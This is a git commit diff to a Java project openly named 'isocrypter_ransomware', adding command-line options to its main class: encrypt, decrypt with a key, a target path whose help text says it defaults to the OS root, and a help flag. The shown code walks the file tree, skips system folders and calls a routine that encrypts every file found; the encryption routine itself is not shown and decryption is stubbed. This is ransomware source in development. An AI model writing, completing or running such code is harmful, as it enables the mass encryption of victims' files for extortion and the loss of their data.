2d7400a77c7d8574a20c8e4003330b0eeeeec313
ISO53 <102249575+ISO53@users.noreply.github.com>
2023-12-04 18:07:54 +0300

    CLI options created

--- isocrypter_ransomware/src/main/java/com/iso53/App.java
+++ isocrypter_ransomware/src/main/java/com/iso53/App.java
@@ -1,19 +1,25 @@
-package isocrypter_ransomware.src.main.java.com.iso53;
+package com.iso53;
+
+import org.apache.commons.cli.*;
 
 import java.io.File;
 import java.util.HashSet;
 
 class App {
 
-    private static final String ROOT_PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial";
-
+    private static String PATH;
     private static HashSet<String> CURR_OS_EXCLUDED_FOLDERS;
 
     public static void main(String[] args) {
 
-        CURR_OS_EXCLUDED_FOLDERS = OS.getCurrentOS() == OS.WINDOWS ? OS.Windows.getExcludedFolders()
-                : OS.Linux.getExcludedFolders();
-        traverseAndEncrypt(new File(ROOT_PATH).listFiles());
+        PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial";
+        CURR_OS_EXCLUDED_FOLDERS = OS.getCurrentOS() == OS.WINDOWS ? OS.Windows.getExcludedFolders() : OS.Linux.getExcludedFolders();
+
+        Options options = new Options();
+        initOptions(options);
+        parseOptions(options, args);
+
+        traverseAndEncrypt(new File(PATH).listFiles());
     }
 
     public static void traverseAndEncrypt(File[] files) {
@@ -30,6 +36,45 @@ class App {
             } else {
                 // System.out.println("File: " + file.getAbsolutePath());
             }
+        }
+    }
+
+    private static void initOptions(Options options) {
+        options.addOption("h", "help", false, "Prints help message.");
+        options.addOption("e", "encrypt", false, "Encrypts all the files in the specified path.");
+        options.addOption(Option
+                .builder("d")
+                .longOpt("decrypt")
+                .desc("Decrypts all the files in the specified path.")
+                .hasArg()
+                .argName("key")
+                .build());
+        options.addOption(Option
+                .builder("p")
+                .longOpt("path")
+                .desc("Specify the path the program should run. Default is the root path of the OS.")
+                .hasArg()
+                .argName("path")
+                .build());
+    }
+
+    private static void parseOptions(Options options, String[] args) {
+        // Parse the command line arguments
+        CommandLineParser parser = new DefaultParser();
+        try {
+            CommandLine cmd = parser.parse(options, args);
+
+            if (cmd.hasOption("help")) {
+                HelpFormatter helpFormatter = new HelpFormatter();
+                helpFormatter.printHelp("IsoCrypter-Ransomware", options);
+            }
+
+            if (cmd.hasOption("decrypt")) {
+                String key = cmd.getOptionValue("decrypt");
+                // traverseAndEncrypt();
+            }
+        } catch (ParseException e) {
+            e.printStackTrace();
         }
     }
 
